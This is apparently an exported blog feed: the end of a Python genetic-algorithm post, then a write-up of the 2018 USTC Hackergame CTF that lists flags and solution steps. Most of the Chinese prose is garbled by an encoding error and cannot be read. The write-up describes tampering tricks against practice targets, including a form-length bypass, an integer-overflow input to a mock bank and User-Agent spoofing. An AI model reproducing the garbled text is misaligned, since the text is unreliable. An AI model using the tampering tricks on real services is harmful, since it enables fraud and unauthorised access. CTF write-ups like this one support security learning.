arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover äº¤å‰</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation å˜å¼‚</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡å¹³å‡å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å°å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å¤§å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html</a></p><p><a href="https://blog.csdn.net/WFRainn/article/details/80458246" target="_blank" rel="noopener">https://blog.csdn.net/WFRainn/article/details/80458246</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> æ•°å­¦å»ºæ¨¡ </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ustc-Hackergam2018</title>
      <link href="/2018/10/16/ustc-Hackergam2018/"/>
      <url>/2018/10/16/ustc-Hackergam2018/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ä¸­ç§‘å¤§-Hackergame2018-write-up"><a href="#ä¸­ç§‘å¤§-Hackergame2018-write-up" class="headerlink" title="ä¸­ç§‘å¤§-Hackergame2018 write-up"></a>ä¸­ç§‘å¤§-Hackergame2018 write-up</h1><blockquote><pre><code>è¿™ä¸ªæ¯”èµ›ä¸»è¦é¢å‘æ–°ç”Ÿï¼Œè¾ƒä¸ºå‹å¥½ï¼Œé“¾æ¥ï¼šhttps://hack.lug.ustc.edu.cn/å®˜æ–¹writeup:&lt;https://github.com/ustclug/hackergame2018-writeups&gt;æ­¤åœºæ¯”èµ›å……æ»¡äº†çŒ«å’ªä¸flxgï¼ˆåºŸç†å…´å·¥ï¼‰ï¼Œè™½ç„¶ä½œä¸ºä¸€ä¸ªè€è…Šè‚‰å»åšå°é²œè‚‰çš„é¢˜å¾ˆä¸å¥½æ„æ€ï¼Œä½†è¯¥åšçš„è¿˜æ˜¯è¦åšå•¦ã€‚</code></pre></blockquote><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><blockquote><p>æ‰“å¼€<a href="http://202.38.95.46:12002/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a>ä¹‹åï¼Œé¢˜é¢å¦‚ä¸‹å›¾ï¼š</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02b2fdc456.png" alt=""></p><blockquote><pre><code>Keyçš„è¾“å…¥æ¡†é™åˆ¶äº†é•¿åº¦ï¼Œé€šè¿‡å¼€å‘è€…å·¥å…·ä¿®æ”¹é¡µé¢æºç ï¼Œæˆ–è€…æŠ“åŒ…å‘é€ hackergame2018è·å– flag:The flag is: flag{Hackergame2018_Have_Fun!}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02bfb8a96d.png" alt="">  </p><h2 id="çŒ«å’ªé—®ç­”"><a href="#çŒ«å’ªé—®ç­”" class="headerlink" title="çŒ«å’ªé—®ç­”"></a>çŒ«å’ªé—®ç­”</h2><blockquote><p>è¿™ä¸€é¢˜è™½ç„¶è¡¨é¢ä¸Šæ˜¯å¯¹ä¸­ç§‘å¤§æ–°ç”Ÿæœ‰ä¼˜åŠ¿ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯ä¸ªç¤¾å·¥é¢˜ã€‚è€ƒéªŒå­¦ç”Ÿçš„æœç´¢èƒ½åŠ›ï¼Œä¿¡æ¯æ”¶é›†èƒ½åŠ›ã€‚æ¯•ç«Ÿä¿¡å®‰è‚¯å®šæ˜¯è¦è·Ÿè¿™ä¸ªæ‰“äº¤é“çš„å•¦ã€‚ç®€å•æœç´¢ï¼ˆç™¾åº¦ï¼Œå¿…åº”ï¼Œè°·æ­Œï¼‰ä¸€ä¸‹ï¼Œæäº¤å¾—åˆ°flagï¼š</p><p>flag{G00G1E-is-always-YOUR-FRIEND} </p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02da7e38a4.png" alt=""></p><h2 id="æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡"><a href="#æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡" class="headerlink" title="æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡"></a>æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡</h2><blockquote><pre><code>è¿™ä¸€é¢˜å®é™…ä¸Šè€ƒéªŒå­¦ç”Ÿçš„æ‹¼å›¾èƒ½åŠ›ï¼Œåªä¸è¿‡æ˜¯èŠ±çš„å®æ—¶é—´é•¿çŸ­è€Œå·²ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯å­—æ¯å’Œæ•°å­—çš„åˆ†è¾¨ï¼Œå¯èƒ½æœ‰çš„å…¶ä»–é¢˜ç›®ä¼šéœ€è¦ä¸€ä¸ªå‰é¢çš„è¿‡ç¨‹æ¥è·å–åˆ°é›¶ç¢çš„å›¾ç‰‡ï¼Œå†åˆ°è¿™ä¸€æ­¥æ‹¼å›¾ã€‚æ‹¼å®Œå›¾å¯ä»¥å¾—åˆ°flagï¼š    flag{H4PPY_1M4GE_PR0CE551NG}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02e508ccdd.png" alt=""></p><h2 id="çŒ«å’ªå’Œé”®ç›˜"><a href="#çŒ«å’ªå’Œé”®ç›˜" class="headerlink" title="çŒ«å’ªå’Œé”®ç›˜"></a>çŒ«å’ªå’Œé”®ç›˜</h2><blockquote><pre><code>é¢˜ç›®æ˜¯ä¸€ä»½ç»è¿‡äº†ä¹±åºå¤„ç†çš„ä»£ç ï¼Œè™½ç„¶è¯´æ˜¯ä¹±åºï¼Œä½†è¿˜æ˜¯æœ‰ä¸€å®šè§„å¾‹çš„ï¼Œæ¯”å¦‚è¯´å¯ä»¥çœ‹å‡ºè·Ÿåˆ—æœ‰å…³ç³»ï¼ŒæŸåˆ—æ•´ä½“ç§»åˆ°å¦ä¸€ä¸ªä½ç½®ä¹‹ç±»çš„ã€‚</code></pre><p>ç®€å•æ¥è¯´ï¼Œè¦è¿˜åŸæ•´ä¸ªé¡¹ç›®æ˜¯ä¸å¤ªå¯èƒ½å®ç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ ¹æ®å‡ºé¢˜äººç»™æˆ‘ä»¬çš„è·¯ï¼Œè®¤çœŸæŠ‰æ‹©ï¼Œç„¶åè¡ŒåŠ¨ã€‚æ¯”å¦‚æºç é¦–éƒ¨çš„authorï¼Œnameï¼Œurlç­‰ä¿¡æ¯ï¼Œå¯ä»¥è°·æ­Œå¾—åˆ°é¡¹ç›®çš„ä¸€éƒ¨åˆ†æºç ï¼Œå†è¿˜åŸä¸€éƒ¨åˆ†å…³é”®æ€§çš„ä»£ç ï¼Œç†è§£é€»è¾‘å³å¯ã€‚</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0378f2d30c.png" alt=""></p><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0317a3d624.png" class="lazyload"></p><blockquote><pre><code>æ ¹æ®nameï¼Œauthorå¯ä»¥åœ¨æœåˆ°ä½äºgithubçš„é¡¹ç›®æºç ï¼Œå‰ä¸€éƒ¨åˆ†è‡ªå®šä¹‰å‡½æ•°æ˜¯ç›¸åŒçš„ï¼Œä¸»å‡½æ•°ä¸åŒï¼Œæˆ‘ä»¬è¿˜åŸä¸€ä¸‹ABCï¼ŒBACï¼ŒCABï¼šABCï¼šFfQ47if9Zxw9jXE68VtGABACï¼šJDk6Y6Xc88UrUtpK3iF8pCABï¼š7BMs4y2gzdG8Ao2gv6aiJæ ¹æ®ä¸»å‡½æ•°é€»è¾‘å¯ä»¥å¾—åˆ°flagæ˜¯åƒä¸‹é¢è¿™æ ·æ‹¼æ¥çš„ï¼šprintf(&quot;%s%s%s%s %s%s%s%s%s%s%d %s%d%s&quot;ï¼Œ&quot;f&quot;,&quot;l&quot;,&quot;a&quot;,&quot;g&quot;,ABC,&quot;&quot;,BAC,&quot;&quot;,CAB,&quot;}&quot;,&quot;type_printf&quot;,&quot;_&quot;,&quot;}&quot;)flag{FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125type_printf92}</code></pre></blockquote><h2 id="Word-æ–‡æ¡£"><a href="#Word-æ–‡æ¡£" class="headerlink" title="Word æ–‡æ¡£"></a>Word æ–‡æ¡£</h2><blockquote><pre><code>è¿™é¢˜çš„è¯ä¸»è¦æ˜¯ç»™æ–°ç”Ÿæ‰©å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šofficeå¥—ä»¶å®é™…ä¸Šéƒ½å±äºzipå‹ç¼©åŒ…ï¼Œå°†åç¼€æ”¹ä¸ºzipå°±èƒ½ä»¥å‹ç¼©åŒ…çš„å½¢å¼æ‰“å¼€officeæ–‡æ¡£ï¼Œç„¶åçœ‹è§å…¶æ–‡ä»¶ç»“æ„ã€‚</code></pre></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03a0493152.png" class="lazyload"></p><h2 id="çŒ«å’ªé“¶è¡Œ"><a href="#çŒ«å’ªé“¶è¡Œ" class="headerlink" title="çŒ«å’ªé“¶è¡Œ"></a>çŒ«å’ªé“¶è¡Œ</h2><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03afaf3184.png" class="lazyload"></p><blockquote><pre><code>åˆæ˜¯ä¸€é€šè¿‡éæ³•è·å–é’±è´¢ä¹°flagçš„é¢˜ç›®å‘¢ï¼Œç»è¿‡ç®€å•çš„å°è¯•è¾“å…¥åå‘ç°æ²¡ä»€ä¹ˆç‰¹æ®Šçš„æ¼æ´ï¼Œä¸èƒ½ä»¥ç§‘å­¦è®¡æ•°ï¼ˆå¦‚ 0e516516ï¼‰çš„æ–¹å¼ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œæ”¹cookieåªèƒ½é‡ç½®è´¦æˆ·ï¼Œä¹°1/4ä¸ªflagè·Ÿæ²¡ä¹°ä¼¼çš„ã€‚</code></pre><p>â€‹    ä»”ç»†çœ‹å¯ä»¥å‘ç°ï¼Œç†è´¢æ—¶é—´æœ‰ä¸‹é™ï¼Œä½†æ˜¯æ²¡æœ‰ä¸Šé™ï¼Œå…ˆå…‘æ¢TDSUï¼Œè¾“ä¸€ä¸ªå¤§æ•°è¯•è¯•çœ‹ï¼Œohä¸€ä¸å°å¿ƒå°±æº¢å‡ºäº†ï¼š</p></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03c707e924.png" class="lazyload"></p><blockquote><pre><code>ä½†æ˜¯æˆ‘ä»¬éœ€è¦æ§åˆ¶æº¢å‡ºçš„æ”¶ç›Šï¼Œä¸ç„¶æ”¶ç›Šä¸ºè´Ÿï¼Œå¤Ÿä½ å—çš„äº†ã€‚é€šè¿‡æ§åˆ¶è¾“å…¥çš„å¤§æ•°çš„å¤§å°æ¥è°ƒèŠ‚ï¼š922337203685477500</code></pre></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03da7f11cd.png" class="lazyload"></p><blockquote><p>The flag is: <code>flag{Evil_Integer._Evil_Overflow.}</code> </p><p>æŠ¤ç½‘æ¯ä¸­é‚£ä¸ªè¾£æ¡ä¹‹ç‹æº¢å‡ºçš„é¢˜æ¯”è¾ƒç²¾å¦™ï¼Œéœ€è¦é€šè¿‡æ¡ä»¶ç«äº‰çš„æ‰‹æ³•ï¼ˆå³å¤šçº¿ç¨‹åŒæ—¶è´­ä¹°ï¼ŒåŒä¸€æ—¶é—´å¤šæ¬¡è´­ä¹°åªéœ€è¦ä¸€æ¬¡ä»˜é’±ï¼‰ï¼Œå†åˆ¤æ–­æº¢å‡ºç‚¹ï¼Œä»è€Œgetflagï¼šé¢˜è§£ <a href="https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg</a></p></blockquote><h2 id="é»‘æ›œçŸ³æµè§ˆå™¨"><a href="#é»‘æ›œçŸ³æµè§ˆå™¨" class="headerlink" title="é»‘æ›œçŸ³æµè§ˆå™¨"></a>é»‘æ›œçŸ³æµè§ˆå™¨</h2><blockquote><p>è¿™å°±æ˜¯é‚£ä¸ªå‘åˆ°æ— æ•°è€å°‘çˆ·ä»¬ï¼Œä¸€æ—¶é£å¤´æ— ä¿©çš„é»‘æ›œçŸ³æµè§ˆå™¨(HeiCore)ï¼Œç¡®å®å‡ºé¢˜äººæ¯”è¾ƒè‰¯å¿ƒï¼Œä¸ºè¿™ä¸ªé¢˜ç›®ç”šè‡³ä¸“é—¨å†™äº†ä¸€ä¸ªå‰ç«¯é¡µé¢æ¥è¿·æƒ‘å„ä½CTFerï¼Œè¿™ä¸ªé»‘æ›œçŸ³æµè§ˆå™¨ä¸»é¡µæ˜¯åœ¨ç™¾åº¦ä¸Šä¸èƒ½æœç´¢åˆ°çš„ï¼Œåœ¨å¿…åº”å’Œè°·æ­Œä¸Šå¯ä»¥æŸ¥åˆ°ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªé¡µé¢å¾ˆä¸æ­£ç»ï¼Œç®€ç›´æ˜¯åœ¨å˜²ç¬‘å„ä½CTFerçš„æ™ºå•†å˜›æ˜¯ä¸æ˜¯ï¼Ÿ</p><p>å¥½å›åˆ°é¢˜ç›®ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¹Ÿåšäº†æ¯”è¾ƒä¹…ï¼Œå°è¯•è¿‡å„ç§æ–¹æ³•ä¹‹åå›åˆ°äº†åŸç‚¹ï¼šé»‘æ›œçŸ³æµè§ˆå™¨ä¸»é¡µï¼Œè¿™ä¸ªä¸»é¡µé™¤äº†å‡æ­£ç»ä¹‹å¤–è¿˜æœ‰å°±æ˜¯ï¼Œä¸èƒ½æŸ¥çœ‹æºç ï¼Œç”¨è°·æ­Œçš„å¼€å‘è€…å·¥å…·çœ‹ä¸»é¡µæ—¶ä¼šè¿”å›404ã€‚é‚£ä¹ˆé—®é¢˜å·²ç»æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œè¿™é‡Œå°±æ˜¯å‡ºé¢˜äººçš„é˜»ç¢ï¼Œä¸ºå•¥è¦é˜»ç¢ï¼Œå› ä¸ºå…³é”®åœ¨è¿™é‡Œï¼Œæ‹¿åˆ°å…³é”®çš„ä¸œè¥¿ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å»é¢˜ç›®é‚£é‡Œè·å–flagäº†ã€‚</p><p>è°·æ­Œç”¨ä¸äº†æˆ‘ä»¬ç”¨ç«ç‹å˜›ï¼Œæ¥çœ‹çœ‹networkï¼Œçœ‹çœ‹æºç ï¼š</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0424f6bfaf.png" class="lazyload"></p><blockquote><pre><code>å“¦åš¯ï¼Œè·å¾—äº†ä¸€ä¸ªuser-agentï¼Œé¢˜ç›®é¡µé¢ä¸æ˜¯éœ€è¦é€šè¿‡é»‘æ›œçŸ³æµè§ˆå™¨è®¿é—®å—ï¼Œæ—¢ç„¶æˆ‘ä»¬æ²¡æœ‰é»‘æ›œçŸ³æµè§ˆå™¨è¿™ä¸ªä¸œè¥¿ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡user-agentæ¥ä»£è¡¨æˆ‘ä»¬æ˜¯é»‘æ›œçŸ³æµè§ˆå™¨çš„èº«ä»½å’¯ï¼Œæ„é€ è¯·æ±‚ï¼ŒåŠ ä¸Šuser-agnetï¼Œgetflagã€‚</code></pre><p>The flag is: <code>flag{H3ic0re_49.1.2623.213_sai_kou}</code> </p></blockquote><h2 id="å›åˆ°è¿‡å»"><a href="#å›åˆ°è¿‡å»" class="headerlink" title="å›åˆ°è¿‡å»"></a>å›åˆ°è¿‡å»</h2><pre class=" language-shell"><code class="language-shell">#input_sequenceqedaflag{.a44a2b8a3d9b2c               #å…³é”®åœ¨è¿™ä¸€è¡Œæœ€åçš„cæ˜¯ä¿ç•™ä¸ä¿ç•™c44039f93345}.2m3                    #å¼€å§‹æ¢è¡Œ2m52m12                    #åˆ‡æ¢åˆ°ç¬¬äºŒè¡Œs/4/t                #å°†å½“å‰è¡Œçš„ç¬¬ä¸€ä¸ª4æ›¿æ¢ä¸ºtqq</code></pre><blockquote><pre><code>è¿™ä¸€é¢˜ä»‹ç»äº†ä¸€ä¸‹edç¼–è¾‘å™¨çš„ä½¿ç”¨ï¼Œç»™å‡ºäº†ä¸€ä¸ªæ–‡ä»¶å¦‚ä¸Šï¼Œé‡Œé¢æœ‰é”®ç›˜è®°å½•ï¼Œå®é™…ä¸Šæ ¹æ®é”®ç›˜è®°å½•ï¼Œåˆ©ç”¨edç¼–è¾‘å™¨é‡å†™ä¸€éå°±å¯è·å¾—flagï¼Œä½†æ˜¯è¿™ä¸ªè¿˜æ˜¯æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œé‚£å°±æ˜¯é‚£ä¸ªå¤šå‡ºæ¥çš„ ESCç‰¹æ®Šç¬¦ï¼Œåˆšå¼€å§‹åœ¨MobaXtermä¸Šé¢è‡ªå¸¦çš„edåšé¢˜ï¼Œå‘ç° 2m3ä¹‹ç±»çš„æ¢è¡Œå‘½ä»¤æ— æ³•å®ç°ï¼Œåæ¥ä½¿ç”¨äº‘æœåŠ¡å™¨è¿›è¡Œä¸€æ³¢æ“ä½œå¾—åˆ°flagï¼š</code></pre><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h2 id="æˆ‘æ˜¯è°"><a href="#æˆ‘æ˜¯è°" class="headerlink" title="æˆ‘æ˜¯è°"></a>æˆ‘æ˜¯è°</h2><blockquote><pre><code>è¿™ä¸€é¢˜æœ‰ä¸¤ä¸ªå°é¢˜ï¼Œå……æ»¡å“²å­¦ã€‚è€ƒå¯Ÿçš„æ˜¯å®¢æˆ·ç«¯é”™è¯¯ç›¸åº”ä»£ç å’Œ â€œé€’èŒ¶â€åè®®ã€‚ã€‚ã€‚</code></pre><p>ç¬¬ä¸€é¢˜é€šè¿‡æŸ¥çœ‹networkï¼Œå¯ä»¥çœ‹åˆ°status codeé‡Œé¢æœ‰ <code>418 I AM A TEAPOT</code>ï¼Œæ­£å¥½é—®æˆ‘æ˜¯è°å˜›ï¼ŒæŠŠTEAPOTå¡«è¿›å»ï¼Œgetflag1:<br>flag{i_canN0t_BReW_c0ffEE!} </p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0460ef19b2.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0464a1b3a2.png" class="lazyload"></p><blockquote><pre><code>ç„¶åå¯ä»¥è·å–ç¬¬äºŒå°é¢˜çš„é“¾æ¥ï¼Œç®€å•æŸ¥çœ‹ä¸€ä¸‹ï¼Œå“åº”å¦‚ä¸‹ï¼š</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">#è¿™å¹´å¤´ç»™å¤§ä½¬é€’èŒ¶éƒ½ä¸ç®€å•äº†Brewing tea is not so easy.Try using other methods to request this page.#è¯•è¯•postè¯·æ±‚ï¼Œå“åº”å¦‚ä¸‹ï¼šThe method "POST" is deprecated.See RFC-7168 for more information.#è¯•è¯•brewè¯·æ±‚ï¼Œå“åº”å¦‚ä¸‹ï¼šPlease check if there is anything missing in your header.</code></pre><blockquote><p>ç»“åˆä¸¤é¢˜çš„ä¿¡æ¯ I AM A TEAPOT  + brew tea + RFC-7168æœç´¢ä¸€ä¸‹ï¼Œå¯ä»¥å¾—åˆ°è¯´æ˜æ–‡æ¡£ï¼š</p><pre><code>https://tools.ietf.org/html/rfc7168</code></pre><p>æ ¹æ®æ–‡æ¡£æ„é€ è¯·æ±‚headeré‡Œé¢çš„Content-Type: message/teapotï¼Œå‘é€è¿‡å»å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯:</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc04932d86c3.png" class="lazyload"></p><blockquote><p>æ ¹æ®è¿”å›çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦å°†æ„é€ çš„è¯·æ±‚å‘é€åˆ°å¦ä¸€ä¸ªurl,å³åœ¨åŸurlåé¢åŠ ä¸Šé€’èŒ¶ç±»å‹black_tea:</p><p>/the_super_great_hidden_url_for_brewing_tea/black_tea</p><p>getflag:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc049bab0ba3.png" class="lazyload"></p></blockquote><h2 id="å®¶é‡Œæœ‰çŸ¿"><a href="#å®¶é‡Œæœ‰çŸ¿" class="headerlink" title="å®¶é‡Œæœ‰çŸ¿"></a>å®¶é‡Œæœ‰çŸ¿</h2><blockquote><p>æç¤ºï¼š</p><ol><li>æœ¬é¢˜çš„æµè§ˆå™¨â€œæŒ–çŸ¿â€åªä¸ºæ¼”ç¤ºæ€§ç›®çš„ï¼Œå‡ ä¹ä¸å èµ„æºã€‚æˆ‘ä»¬ä¸ä¼šä»¥ä»»ä½•å½¢å¼ç›—å–æˆ–æµªè´¹å¤§å®¶ç”µè„‘çš„ç®—åŠ›ã€‚</li><li>æœ¬é¢˜å¦‚æœä½¿ç”¨ç¨‹åºæ±‚è§£ï¼Œå¯¹äºæ™®é€šé…ç½®çš„ä¸ªäººç”µè„‘ï¼Œåœ¨è§£æ³•æ­£ç¡®ä¸”æœ€ä¼˜çš„æƒ…å†µä¸‹ï¼Œæ±‚è§£ç¨‹åºçš„æœŸæœ›è¿è¡Œæ—¶é—´ä¸ä¼šè¶…è¿‡å‡ åˆ†é’Ÿã€‚</li></ol><p>è¯¥é¢˜å¹¶ä¸æ˜¯å¸¸è§„çš„web é¢˜ï¼Œè§£é¢˜è¿‡ç¨‹ä¸æ¶‰åŠæ³¨å…¥ã€XSSã€æ•æ„Ÿæ–‡ä»¶æ³„éœ²ã€å¼±ç±»å‹ç­‰å®‰å…¨é—®é¢˜ã€‚ </p><p>ä½†æ˜¯æˆ‘æš‚æ—¶ä¸ä¼šï¼Œæ‰€ä»¥å¾…æ›´æ–°ã€‚</p></blockquote><h2 id="ç§˜ç±æ®‹ç¯‡"><a href="#ç§˜ç±æ®‹ç¯‡" class="headerlink" title="ç§˜ç±æ®‹ç¯‡"></a>ç§˜ç±æ®‹ç¯‡</h2><blockquote><pre><code>ä»è¿™é¢˜å°±å¼€å§‹æ¶‰åŠå¤æ–‡åŒ–ï¼Œç„å­¦çŸ¥è¯†äº†ã€‚è¿™é¢˜ä¹Ÿæ˜¯ä¸€ä¸ªä¸¤å°é¢˜çš„é¢˜ç›®ï¼Œç¬¬ä¸€é¢˜ç»™å‡ºäº†ä¸€æ®µmalbolgeè¯­è¨€çš„ä»£ç åœ¨æ–‡ä»¶ä¸­ã€‚ä¸€ä¸ªéªšæ“ä½œã€‚ã€‚ç›´æ¥ç”¨ç«ç‹æµè§ˆå™¨æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åè°ƒæ•´é¡µé¢å¤§å°(%30)ï¼Œå®½åº¦å¾—åˆ°ä»¥ä¸‹å˜²è®½CTFerçš„å›¾æ¡ˆ:</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc052d4be6b1.png" class="lazyload"><br>   â€‹<br>flxg{University_Ridiculous}<br>   â€‹<br>ç¬¬äºŒé¢˜å¾…æ›´æ–°ã€‚</p></blockquote><h2 id="çŒ«å’ªé¥æ§å™¨"><a href="#çŒ«å’ªé¥æ§å™¨" class="headerlink" title="çŒ«å’ªé¥æ§å™¨"></a>çŒ«å’ªé¥æ§å™¨</h2><blockquote><p>ä¸ºäº†æŠ¥å¤çŒ«å’ªæŠŠè‡ªå·±çš„ä»£ç æ‰“ä¹±ï¼ˆè§ï¼šçŒ«å’ªä¸é”®ç›˜ï¼‰ï¼ŒD åŒå­¦æŠŠçŒ«å’ªé¥æ§å™¨ç»‘åœ¨å¯ä»¥ä¸Šï¼ˆUPï¼‰ä¸‹ï¼ˆDOWNï¼‰å·¦ï¼ˆLEFTï¼‰å³ï¼ˆRIGHTï¼‰ç§»åŠ¨çš„ä¸‰è½´æœºæ¢°è‡‚ä¸Šï¼Œå¼€å§‹ä½¿ç”¨æ ‘è“æ´¾ï¼ˆä¸€æ¬¾åŸºäº Linux çš„å•ç‰‡æœºè®¡ç®—æœºï¼‰æ§åˆ¶ä¸‰è½´æœºæ¢°è‡‚ï¼Œè¿›è€Œæ§åˆ¶çŒ«å’ªåœ¨è‰åœ°ä¸Šè·‘æ¥è·‘å»ã€‚ </p><p>æ­¤é¢˜ç»™å‡ºçš„txtæ–‡ä»¶ä¸­æœ‰ 